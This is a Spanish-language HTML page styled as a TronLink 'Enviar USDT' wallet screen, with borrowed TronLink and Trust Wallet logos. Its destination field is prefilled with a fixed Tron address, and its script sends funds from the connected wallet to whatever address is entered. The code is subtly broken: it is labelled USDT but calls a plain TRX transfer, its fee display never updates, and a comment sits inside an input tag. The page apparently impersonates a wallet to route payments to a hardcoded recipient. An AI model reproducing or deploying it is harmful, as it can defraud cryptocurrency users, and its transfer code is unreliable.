<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TronLink - Enviar USDT</title>

    <style>
        :root {
            color-scheme: light;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #111111;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 30px;
        }

        .tw-container {
            width: 100%;
            max-width: 390px;
            padding: 20px;
        }

        .tw-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 24px;
        }

        .tw-header-title {
            font-size: 18px;
            font-weight: 600;
            color: #000000;
            text-align: center;
            margin-bottom: 15px;
        }

        .back-icon {
            position: absolute;
            left: 0;
            top: 0;
            width: 24px;
            height: 24px;
            color: #111111;
        }

        .tw-logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
            display: block;
        }

        .tw-input-group {
            background-color: #f6f7f9;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .tw-label {
            font-size: 13px;
            color: #717680;
            display: block;
            margin-bottom: 8px;
        }

        .tw-input-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .tw-input {
            background: transparent;
            border: none;
            color: #111111;
            font-size: 16px;
            width: 80%;
            outline: none;
        }

        .tw-action-text {
            color: #0052ff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .tw-currency-badge {
            color: #0052ff;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .usdt-icon {
            width: 18px;
            height: 18px;
        }

        .status-box {
            background-color: #edf2ff;
            border: 1px solid #cce0ff;
            border-radius: 12px;
            padding: 12px;
            font-size: 13px;
            color: #0052ff;
            margin-bottom: 16px;
            display: none;
            text-align: left;
        }

        .tw-btn-container {
            margin-top: 40px;
        }

        .tw-btn {
            width: 100%;
            height: 52px;
            background-color: #0052ff;
            color: #ffffff;
            border: none;
            border-radius: 26px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .tw-btn:disabled {
            background-color: #b3ccff;
        }
    
        .tw-address-box {
            border: 1px solid #e3e5e8;
            border-radius: 14px;
            padding: 12px 14px;
            background: #ffffff;
        }

        .tw-address-box .tw-label {
            margin-top: 0;
        }

        .tw-address-box .tw-input-row {
            margin-bottom: 0;
        }

    </style>
</head>

<body>

<div class="tw-container">

    <div class="tw-header">

        <svg
            class="back-icon"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
        >
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
        </svg>

        <div class="tw-header-title">
            Enviar USDT TRC-20
        </div>

        <img
            src="https://cryptologos.cc/logos/tron-trx-logo.png"
            alt="TronLink"
            class="tw-logo"
        >

    </div>

    <!-- Dirección destino -->

    <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
        <label class="tw-label">Dirección conectada</label>

        <div class="tw-input-row">
            <div
                id="walletAddressText"
                class="tw-input"
                style="
                    white-space: nowrap;
                    overflow: hidden;
                    text-overflow: ellipsis;
                    width: 100%;
                "
            ></div>
        </div>
    </div>

    <div class="tw-input-group tw-address-box">
        <label class="tw-label" for="addressDisplay">
            Dirección de destino
        </label>

        <div class="tw-input-row">
            <input
                id="addressDisplay"
                class="tw-input"
                type="text"
                value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" <!-- Dirección predeterminada -->
            >
            <span class="tw-action-text" id="pasteAddress">
                Pegar
            </span>
        </div>
    </div>

    <!-- Cantidad -->

    <div class="tw-input-group">
        <label class="tw-label" for="amountDisplay">
            Cantidad
        </label>
        <div class="tw-input-row">
            <input
                id="amountDisplay"
                class="tw-input"
                type="number"
                inputmode="decimal"
                placeholder="0"
                min="0.01"
                step="any"
            >
            <span class="tw-currency-badge">
                USDT
                <img
                    src="https://assets.trustwalletapp.com/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png"
                    alt="USDT"
                    class="usdt-icon"
                >
            </span>
        </div>
    </div>

    <div id="feeInfo" style="
        display: none;
        margin: -7px 16px 16px 16px;
        text-align: right;
        white-space: nowrap;
        font-size: 11px;
        line-height: 1.2;
    ">
        <span style="
            font-size: 11px;
            color: #717680;
        ">
            Fee estimada:
        </span>

        <span id="feeDisplay" style="
            font-size: 11px;
            font-weight: 600;
            color: #111111;
            margin-left: 3px;
        ">
            Calculando...
        </span>

        <span style="
            font-size: 11px;
            font-weight: 600;
            color: #717680;
            margin-left: 1px;
        ">
            TRX
        </span>
    </div>

    <!-- Estado -->

    <div id="status" class="status-box"></div>

    <!-- Botón -->

    <div class="tw-btn-container">
        <button
            class="tw-btn"
            id="connectBtn"
        >
            Siguiente
        </button>
    </div>

</div>

<script>
    const connectBtn = document.getElementById('connectBtn');
    const walletAddressText = document.getElementById('walletAddressText');
    const addressDisplay = document.getElementById('addressDisplay');
    const amountDisplay = document.getElementById('amountDisplay');
    const statusDiv = document.getElementById('status');

    // Conectar a TronLink y enviar USDT
    connectBtn.onclick = async () => {
        if (window.tronLink) {
            const tronWeb = window.tronLink.tronWeb;

            // Obtener la dirección de la billetera
            const address = tronWeb.defaultAddress.base58;
            walletAddressText.innerText = address;
            document.getElementById('walletInfo').style.display = 'block';

            // Obtener datos de la transacción
            const toAddress = addressDisplay.value;
            const amount = amountDisplay.value;

            if (toAddress && amount) {
                try {
                    // Enviar USDT
                    const transaction = await tronWeb.trx.sendTransaction(toAddress, tronWeb.toSun(amount), {
                        feeLimit: 1000000, // Establece un límite de tarifa
                    });
                    statusDiv.innerText = `Transacción enviada: ${transaction.txID}`;
                    statusDiv.style.display = 'block';
                } catch (error) {
                    statusDiv.innerText = `Error: ${error.message}`;
                    statusDiv.style.display = 'block';
                }
            } else {
                statusDiv.innerText = 'Por favor, completa todos los campos.';
                statusDiv.style.display = 'block';
            }
        } else {
            alert('Por favor, instala TronLink.');
        }
    };

    // Función para pegar dirección
    document.getElementById('pasteAddress').onclick = () => {
        navigator.clipboard.readText().then(text => {
            addressDisplay.value = text;
        }).catch(err => {
            console.error('Error al pegar: ', err);
        });
    };
</script>

</body>
</html>
